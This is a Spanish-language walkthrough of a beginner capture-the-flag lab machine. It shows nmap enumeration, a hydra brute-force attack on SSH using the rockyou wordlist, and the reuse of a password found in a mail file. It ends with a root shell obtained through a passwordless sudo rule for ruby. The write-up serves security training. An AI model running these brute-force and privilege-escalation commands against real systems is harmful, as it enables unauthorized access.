
## Resumen

Es una maquina de dificultad muy facil en la que se trabaja el uso de la fuerza bruta a un servidor ssh y la escalada de privilegios.


## Enumeracion

Empiezo haciendo un ping a la maquina para ver el TTL y asi hacerme una idea de que sistema operativo esta usando.
`ping -c 1 vmip`

Sigo enumerando con nmap para ver que puertos tiene abiertos.
`nmap -sVC vmip`
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 41:16:eb:54:64:34:d1:69:ee:dc:d9:21:9c:72:a5:c1 (RSA)
|   256 f0:c4:2b:02:50:3a:49:a7:a2:34:b8:09:61:fd:2c:6d (ECDSA)
|_  256 df:e9:46:31:9a:ef:0d:81:31:1f:77:e4:29:f5:c9:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: B6:6D:A4:1F:2E:F2 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Analisis puerto 80

Empiezo haciendo un curl a la web para ver que devuelve.
`curl vmip`
`<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->`

Devuelve un comentario, en principio con esto no se puede hacer mucho pero como queda el puerto 22 voy a probar un ataque de fuerza bruta contra el respectivo puerto.

## Fuerza bruta al puerto 22

Ya que el mensaje es de Juan para Camilo diciendo que tiene algo importante.
Asi que empiezo haciendo fuerza bruta al usuario camilo.

`hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2`
```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-26 18:41:56
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: camilo   password: p***
```


## Escalada de privilegios

### Usuario camilo

Una vez con el usuario camilo empiezo ejecutando `sudo -l` para ver si podemos conseguir sudo.
```
$ sudo -l
[sudo] password for camilo: 
Sorry, user camilo may not run sudo on 0547a2728bb4.
$ 
```

Veo que no puedo asi que miro que archivos hay con SUID.
`find / -perm -4000 -type f 2>/dev/null`
```
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/umount
/bin/su
/bin/mount
```

Son los SUID estandar asi que mi siguiente paso es ejecutar linpeas.

En la maquina atacante:

```
python3 -m http.server 8000     
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ..
```


Desde el usuario camilo:
` wget http://172.17.0.1:8000/linpeas.sh -O /tmp/linpeas.sh `
`chmod +x /tmp/linpeas.sh`
`./linpeas.sh`


Y al terminar el escaneo nos encuentra esto:

`425278      4 -rw-r--r--   1 root     mail          144 Apr 25  2024 /var/mail/camilo/correo.txt`

Dice que hay un correo como indicaba el comentario de la web asi que me dispongo a leerlo.

`Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k****`

Ya teniendo la contraseña de Juan tocara entrar al usuario Juan.

### Usuario Juan

`su juan`

Ya con el usuario juan vuelvo a probar `sudo -l` para ver que puede ejecutar con sudo.

```
$ sudo -l
Matching Defaults entries for juan on 3fa9ed8f887d:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User juan may run the following commands on 3fa9ed8f887d:
    (ALL) NOPASSWD: /usr/bin/ruby

```

Aqui veo ya algo interesante que es que podemos ejecutar ruby como cualquier usuario sin necesidad de contraseña. 

Esto podemos usarlo a nuestro favor para conseguir una shell como root.
````
sudo ruby -e 'exec "/bin/sh"'
````

Con este comando lo que hacemos es pasarle un codigo como string y luego reemplaza el proceso actual por lo que le decimos en el comando que  en este caso es una shell.

### Root

Una vez ejecutado ejecuto `whoami` para comprobar que somos root.
`# whoami`
`root`


